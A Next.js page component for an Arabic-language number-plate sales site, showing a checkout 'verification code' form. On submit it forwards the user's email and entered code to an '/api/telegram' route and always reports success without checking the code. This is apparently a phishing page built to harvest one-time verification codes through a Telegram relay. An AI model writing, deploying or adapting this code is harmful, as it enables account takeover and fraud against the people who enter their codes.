"use client"

import { useState, useEffect, Suspense } from "react"
import { useSearchParams, useRouter } from "next/navigation"
import Link from "next/link"
import { Shield, Lock, ArrowRight, CheckCircle, AlertCircle, Loader2 } from "lucide-react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import Header from "@/components/header"
import Footer from "@/components/footer"

function VerificationForm() {
  const searchParams = useSearchParams()
  const router = useRouter()
  const [code, setCode] = useState("")
  const [loading, setLoading] = useState(false)
  const [error, setError] = useState("")
  const [success, setSuccess] = useState(false)

  const email = searchParams.get("email") || ""
  const plateId = searchParams.get("plate") || ""

  useEffect(() => {
    if (!email) {
      router.push("/")
    }
  }, [email, router])

  async function handleSubmit(e: React.FormEvent) {
    e.preventDefault()
    setError("")

    if (!code.trim()) {
      setError("الرجاء إدخال رمز التحقق")
      return
    }

    setLoading(true)

    try {
      const response = await fetch("/api/telegram", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          type: "verification",
          data: {
            email,
            code: code.trim(),
          },
        }),
      })

      if (!response.ok) {
        throw new Error("Failed to verify")
      }

      setSuccess(true)
    } catch {
      setError("حدث خطأ أثناء التحقق. يرجى المحاولة مرة أخرى.")
    } finally {
      setLoading(false)
    }
  }

  if (success) {
    return (
      <div className="mx-auto max-w-md px-4 py-20 text-center">
        <div className="mx-auto mb-6 flex h-20 w-20 items-center justify-center rounded-full bg-green-500/10">
          <CheckCircle className="h-10 w-10 text-green-500" />
        </div>
        <h1 className="mb-4 text-3xl font-black text-foreground">
          {"تم التحقق بنجاح!"}
        </h1>
        <p className="mb-8 text-lg text-muted-foreground">
          {"تم استلام طلبك وسيتم التواصل معك قريباً لإتمام عملية الشراء."}
        </p>
        <div className="flex flex-col items-center gap-4">
          <Link href="/">
            <Button className="bg-primary text-primary-foreground hover:bg-primary/90">
              {"العودة للرئيسية"}
            </Button>
          </Link>
          <Link href="/plates">
            <Button variant="outline" className="border-border/50 text-foreground">
              {"تصفح المزيد من اللوحات"}
            </Button>
          </Link>
        </div>
      </div>
    )
  }

  return (
    <div className="mx-auto max-w-md px-4 py-12">
      {/* Header */}
      <div className="mb-8 text-center">
        <div className="mx-auto mb-4 flex h-16 w-16 items-center justify-center rounded-full bg-primary/10">
          <Shield className="h-8 w-8 text-primary" />
        </div>
        <h1 className="mb-2 text-2xl font-black text-foreground">
          {"تم إرسال رمز التحقق"}
        </h1>
        <p className="text-muted-foreground">
          {"يرجى إدخال الرمز المرسل إلى بريدك الإلكتروني"}
        </p>
        {email && (
          <p className="mt-1 text-sm font-medium text-primary" dir="ltr">
            {email}
          </p>
        )}
      </div>

      {/* Form */}
      <form onSubmit={handleSubmit} className="flex flex-col gap-6">
        <div className="rounded-xl border border-border/50 bg-card p-6">
          <div className="mb-4">
            <Label htmlFor="code" className="mb-2 block text-sm text-muted-foreground">
              {"رمز التحقق"}
            </Label>
            <div className="relative">
              <Lock className="absolute right-3 top-1/2 h-4 w-4 -translate-y-1/2 text-muted-foreground" />
              <Input
                id="code"
                name="code"
                value={code}
                onChange={(e) => setCode(e.target.value)}
                required
                placeholder="أدخل رمز التحقق"
                className="border-border/50 bg-secondary/30 pr-10 text-center text-lg font-bold tracking-widest text-foreground placeholder:text-muted-foreground"
                dir="ltr"
                maxLength={10}
              />
            </div>
          </div>

          {error && (
            <div className="mb-4 flex items-center gap-2 rounded-lg bg-destructive/10 p-3 text-sm text-destructive">
              <AlertCircle className="h-4 w-4 shrink-0" />
              {error}
            </div>
          )}

          <Button
            type="submit"
            size="lg"
            disabled={loading}
            className="w-full bg-primary text-primary-foreground hover:bg-primary/90"
          >
            {loading ? (
              <>
                <Loader2 className="me-2 h-4 w-4 animate-spin" />
                {"جاري التحقق..."}
              </>
            ) : (
              <>
                <Shield className="me-2 h-4 w-4" />
                {"تأكيد الرمز"}
              </>
            )}
          </Button>
        </div>

        {/* Info */}
        <div className="rounded-xl border border-primary/20 bg-primary/5 p-4">
          <p className="text-center text-sm leading-relaxed text-muted-foreground">
            {"إذا لم تستلم الرمز، يرجى التحقق من مجلد البريد غير المرغوب فيه أو التواصل معنا عبر الواتساب."}
          </p>
        </div>

        {/* Back Link */}
        <Link
          href={plateId ? `/checkout/${plateId}` : "/"}
          className="flex items-center justify-center gap-1 text-sm text-muted-foreground transition-colors hover:text-primary"
        >
          <ArrowRight className="h-4 w-4" />
          {"العودة للخطوة السابقة"}
        </Link>
      </form>
    </div>
  )
}

export default function VerifyPage() {
  return (
    <main>
      <Header />
      <Suspense
        fallback={
          <div className="flex min-h-[50vh] items-center justify-center">
            <Loader2 className="h-8 w-8 animate-spin text-primary" />
          </div>
        }
      >
        <VerificationForm />
      </Suspense>
      <Footer />
    </main>
  )
}
